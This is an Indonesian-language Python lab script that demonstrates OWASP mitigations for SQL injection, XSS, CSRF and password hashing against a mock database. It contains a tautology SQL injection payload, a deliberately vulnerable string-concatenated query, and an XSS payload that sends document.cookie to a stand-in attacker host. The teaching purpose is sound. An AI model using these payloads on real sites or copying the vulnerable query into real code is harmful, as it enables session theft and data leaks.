#!/usr/bin/env python3
"""
Lab Exercise: Keamanan Full-Stack Defensif (OWASP Top 10 Mitigation Lab)
Modul 01 - Simulasi Interaktif Pertahanan Aplikasi Web & API
"""

import sys
import time
import secrets
import hashlib
import hmac
import html
import re
from typing import Dict, Any, Tuple

# ANSI Escape Codes untuk Visualisasi Terminal
class Style:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_BLUE = "\033[44m"


def print_banner() -> None:
    print(f"{Style.CYAN}{Style.BOLD}")
    print("=" * 70)
    print("  OWASP FULL-STACK DEFENSIVE SECURITY LAB - SIMULATION ENGINE")
    print("  Materi: SQLi, Stored XSS, CSRF Token, & Password Salt Hashing")
    print("=" * 70 + f"{Style.RESET}\n")


# --------------------------------------------------------------------------
# Simulasi 1: SQL Injection (Vulnerable vs Parameterized Defense)
# --------------------------------------------------------------------------
class MockDatabase:
    def __init__(self):
        self.users = {
            "alice": {"id": 1, "role": "user", "secret": "Token-A101"},
            "admin": {"id": 2, "role": "superuser", "secret": "Master-Key-999"},
            "bob": {"id": 3, "role": "guest", "secret": "Guest-001"}
        }

    def execute_vulnerable(self, username_input: str) -> Tuple[bool, str]:
        # Simulasi string concatenation query SQL rentan:
        # SELECT * FROM users WHERE username = '<input>'
        query = f"SELECT * FROM users WHERE username = '{username_input}'"
        print(f"  {Style.YELLOW}[RAW QUERY]:{Style.RESET} {query}")
        
        # Deteksi payload injeksi boolean/tautologi klasik
        if "' OR '1'='1" in username_input or "' or 1=1" in username_input.lower():
            all_data = [f"id:{v['id']}, user:{k}, role:{v['role']}, secret:{v['secret']}" for k, v in self.users.items()]
            return True, f"{Style.RED}[LEAKED ALL RECORDS VIA SQLi]:{Style.RESET} " + "; ".join(all_data)
        
        # Eksekusi normal
        clean_name = username_input.strip("'")
        if clean_name in self.users:
            rec = self.users[clean_name]
            return True, f"User Record Found: user={clean_name}, role={rec['role']}"
        return False, "User not found"

    def execute_defensive(self, username_input: str) -> Tuple[bool, str]:
        # Simulasi Prepared Statement / Parameterized Query:
        # DB Engine memisahkan parser SQL AST dengan parameter data mentah
        query_template = "SELECT * FROM users WHERE username = ?"
        params = (username_input,)
        print(f"  {Style.GREEN}[PREPARED QUERY]:{Style.RESET} {query_template} with params={params}")
        
        # Parameter diperlakukan strictly sebagai literal string, bukan instruksi parser
        if username_input in self.users:
            rec = self.users[username_input]
            return True, f"User Record Found: user={username_input}, role={rec['role']}"
        return False, f"Safe Result: User '{username_input}' not found (Attack Payload Neutralized as literal string)"


def run_sqli_demo() -> None:
    print(f"\n{Style.BOLD}{Style.BLUE}>>> [SCENARIO 1] SQL Injection Mitigation (OWASP A03:2021 - Injection){Style.RESET}")
    db = MockDatabase()
    payload = "admin' OR '1'='1"

    print(f"\n1. Penyerang menginput payload: {Style.RED}{payload}{Style.RESET}")
    print(f"{Style.UNDERLINE}Uji Arsitektur Rentan (String Concatenation):{Style.RESET}")
    status, msg = db.execute_vulnerable(payload)
    print(f"  Status: {Style.RED}{'EXPLOITED' if status else 'FAILED'}{Style.RESET} -> {msg}")

    print(f"\n{Style.UNDERLINE}Uji Arsitektur Defensif (Parameterized Query):{Style.RESET}")
    status, msg = db.execute_defensive(payload)
    print(f"  Status: {Style.GREEN}{'SUCCESS' if status else 'PROTECTED'}{Style.RESET} -> {msg}\n")


# --------------------------------------------------------------------------
# Simulasi 2: Cross-Site Scripting (Reflected & Stored XSS Mitigation)
# --------------------------------------------------------------------------
def sanitize_context_html(raw_input: str) -> str:
    """Menggunakan Context-Aware Output Encoding (HTML Entities escaping)"""
    return html.escape(raw_input, quote=True)


def run_xss_demo() -> None:
    print(f"\n{Style.BOLD}{Style.BLUE}>>> [SCENARIO 2] Cross-Site Scripting (OWASP A03:2021 - Injection / XSS){Style.RESET}")
    xss_payload = "<script>fetch('https://attacker.evil/steal?c=' + document.cookie)</script>"
    print(f"Payload Pengguna: {Style.RED}{xss_payload}{Style.RESET}")

    # Rendering rentan: unescaped template
    print(f"\n{Style.UNDERLINE}Mode Rentan (Direct DOM InnerHTML / Unescaped String):{Style.RESET}")
    vulnerable_render = f"<div>Welcome, {xss_payload}!</div>"
    print(f"  Browser DOM Parser Output: {Style.RED}{vulnerable_render}{Style.RESET}")
    print(f"  {Style.BG_RED} BAHAYA {Style.RESET} Browser akan mengeksekusi tag <script> & mencuri sesi aktif!")

    # Rendering defensif: escaped entities
    print(f"\n{Style.UNDERLINE}Mode Defensif (Strict HTML Entity Encoding):{Style.RESET}")
    safe_output = sanitize_context_html(xss_payload)
    defensive_render = f"<div>Welcome, {safe_output}!</div>"
    print(f"  Browser DOM Parser Output: {Style.GREEN}{defensive_render}{Style.RESET}")
    print(f"  {Style.BG_GREEN} AMAN {Style.RESET} Browser merender teks murni & karakter '<' / '>' diubah menjadi entity harmless (&lt;, &gt;).\n")


# --------------------------------------------------------------------------
# Simulasi 3: CSRF Protection (Synchronizer Token Pattern & Double Submit)
# --------------------------------------------------------------------------
class CsrfSessionManager:
    def __init__(self):
        self.active_sessions: Dict[str, str] = {}

    def login_user(self, session_id: str) -> str:
        # Menghasilkan Cryptographically Secure Random Token (CSPRNG)
        token = secrets.token_hex(32)
        self.active_sessions[session_id] = token
        return token

    def verify_action(self, session_id: str, received_csrf_token: str) -> Tuple[bool, str]:
        if session_id not in self.active_sessions:
            return False, "Sesi tidak valid / expired"
        
        expected_token = self.active_sessions[session_id]
        
        # Hindari timing attacks dengan hmac.compare_digest
        if hmac.compare_digest(expected_token, received_csrf_token):
            return True, "CSRF Token Terverifikasi (Authentic State-Changing Request)"
        return False, "CSRF Token Mismatch! Serangan Cross-Site Request Forgery Digagalkan"


def run_csrf_demo() -> None:
    print(f"\n{Style.BOLD}{Style.BLUE}>>> [SCENARIO 3] CSRF Defense (Synchronizer Token Pattern & Timing-Safe Check){Style.RESET}")
    manager = CsrfSessionManager()
    session_id = "sess_user_alpha_772"
    valid_token = manager.login_user(session_id)

    print(f"1. User login -> Session ID: {session_id}")
    print(f"   CSRF Synchronizer Token dikeluarkan server: {Style.CYAN}{valid_token}{Style.RESET}")

    # Skenario A: Serangan pihak ketiga tanpa header/body token valid
    attacker_forged_token = secrets.token_hex(32)
    print(f"\n{Style.UNDERLINE}Uji Request Palsu dari Situs Pihak Ketiga (Attacker Phishing Form):{Style.RESET}")
    is_valid, msg = manager.verify_action(session_id, attacker_forged_token)
    print(f"  Hasil Validasi: {Style.RED if not is_valid else Style.GREEN}{msg}{Style.RESET}")

    # Skenario B: Request sah dengan token yang cocok
    print(f"\n{Style.UNDERLINE}Uji Request Sah dari Single Page App / Form Internal:{Style.RESET}")
    is_valid, msg = manager.verify_action(session_id, valid_token)
    print(f"  Hasil Validasi: {Style.GREEN if is_valid else Style.RED}{msg}{Style.RESET}\n")


# --------------------------------------------------------------------------
# Simulasi 4: Password Storage (Anti Plaintext/MD5 vs Cryptographic PBKDF2)
# --------------------------------------------------------------------------
def insecure_md5_hash(password: str) -> str:
    return hashlib.md5(password.encode("utf-8")).hexdigest()


def secure_pbkdf2_hash(password: str, salt: bytes = None) -> Tuple[str, str]:
    if salt is None:
        salt = secrets.token_bytes(16)
    # 100,000 iterasi PBKDF2 dengan SHA256 (Key Stretching untuk memperlambat Brute Force/GPU)
    key = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, 100000)
    return salt.hex(), key.hex()


def run_password_hashing_demo() -> None:
    print(f"\n{Style.BOLD}{Style.BLUE}>>> [SCENARIO 4] Password Storage (OWASP A02:2021 - Cryptographic Failures){Style.RESET}")
    user_pw = "SuperSecretP@ssw0rd2026!"
    print(f"Password Pengguna: {Style.YELLOW}{user_pw}{Style.RESET}")

    # Praktik Buruk: MD5 tanpa Salt (Rentan Rainbow Table)
    md5_hash = insecure_md5_hash(user_pw)
    print(f"\n{Style.UNDERLINE}Penyimpanan Usang (MD5 / Fast Hash Tanpa Salt):{Style.RESET}")
    print(f"  Hash: {Style.RED}{md5_hash}{Style.RESET}")
    print(f"  {Style.RED}Kelemahan: Komputasi terlalu cepat (~miliaran/detik pada GPU) & rentan lookup table.{Style.RESET}")

    # Praktik Baku OWASP: Salt Unik + Key Stretching (PBKDF2/Argon2/Bcrypt)
    print(f"\n{Style.UNDERLINE}Penyimpanan Defensif Baku (PBKDF2-HMAC-SHA256, 100k Iterasi + 16-byte Salt):{Style.RESET}")
    salt_hex, key_hex = secure_pbkdf2_hash(user_pw)
    print(f"  Salt Unik (CSPRNG): {Style.MAGENTA}{salt_hex}{Style.RESET}")
    print(f"  Derived Key       : {Style.GREEN}{key_hex}{Style.RESET}")
    print(f"  {Style.GREEN}Keunggulan: Kebal terhadap rainbow table; waktu komputasi sengaja diperlambat untuk menghalangi offline cracking.{Style.RESET}\n")


# --------------------------------------------------------------------------
# Main Interactive Menu
# --------------------------------------------------------------------------
def interactive_menu() -> None:
    print_banner()
    while True:
        print(f"{Style.BOLD}PILIH MENU SIMULASI KEAMANAN DEFENSIP:{Style.RESET}")
        print("  [1] Simulasi SQL Injection vs Parameterized Queries")
        print("  [2] Simulasi Cross-Site Scripting (XSS) vs Output Encoding")
        print("  [3] Simulasi CSRF Protection (Token Synchronizer)")
        print("  [4] Simulasi Password Hashing Defensif (PBKDF2 vs MD5)")
        print("  [5] Jalankan Seluruh Simulasi Otomatis (Comprehensive Audit)")
        print("  [0] Keluar (Exit)")
        
        try:
            choice = input(f"\n{Style.CYAN}Masukkan nomor opsi [0-5]: {Style.RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nProgram dihentikan oleh pengguna.")
            break

        if choice == "1":
            run_sqli_demo()
        elif choice == "2":
            run_xss_demo()
        elif choice == "3":
            run_csrf_demo()
        elif choice == "4":
            run_password_hashing_demo()
        elif choice == "5":
            print(f"\n{Style.BOLD}--- MEMULAI FULL SECURITY DEMONSTRATION SUITE ---{Style.RESET}")
            run_sqli_demo()
            time.sleep(0.5)
            run_xss_demo()
            time.sleep(0.5)
            run_csrf_demo()
            time.sleep(0.5)
            run_password_hashing_demo()
            print(f"{Style.BG_GREEN}{Style.BOLD} [SUCCESS] Seluruh pengujian pertahanan OWASP selesai dijalankan! {Style.RESET}\n")
        elif choice == "0":
            print(f"{Style.GREEN}Terima kasih telah mengikuti lab keamanan full-stack defensif.{Style.RESET}")
            break
        else:
            print(f"{Style.RED}Opsi tidak valid, silakan masukkan angka antara 0 hingga 5.{Style.RESET}\n")


if __name__ == "__main__":
    # Jika dijalankan dengan argumen --auto atau non-interaktif, jalankan semua test
    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        print_banner()
        run_sqli_demo()
        run_xss_demo()
        run_csrf_demo()
        run_password_hashing_demo()
    else:
        interactive_menu()
